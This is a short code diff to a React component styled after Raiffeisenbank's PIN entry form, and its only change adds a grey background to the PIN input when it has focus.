@@ -138,7 +138,7 @@ const Raiffeisenbank = () => {
             value={pin}
             onChange={(e) => setPin(e.target.value)}
             placeholder=" "
-            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315]"
+            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8]"
           />
           <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
             PIN eingeben <span className="text-gray-400">*</span>
